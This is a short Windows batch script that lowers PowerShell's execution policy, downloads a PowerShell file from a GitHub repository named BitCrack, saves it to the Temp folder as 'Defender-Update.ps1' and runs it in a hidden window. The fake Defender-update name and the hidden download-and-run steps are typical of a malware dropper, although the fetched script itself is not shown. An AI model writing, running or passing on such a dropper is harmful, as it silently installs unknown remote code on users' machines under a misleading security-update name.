@echo off
powershell set-executionpolicy remotesigned
curl https://raw.githubusercontent.com/rugved-mahamune/BitCrack/master/Defender-Updater.ps1 --output C:\Users\%USERNAME%\AppData\Local\Temp\Defender-Update.ps1
powershell -windowstyle hidden -file C:\Users\%USERNAME%\AppData\Local\Temp\Defender-Update.ps1
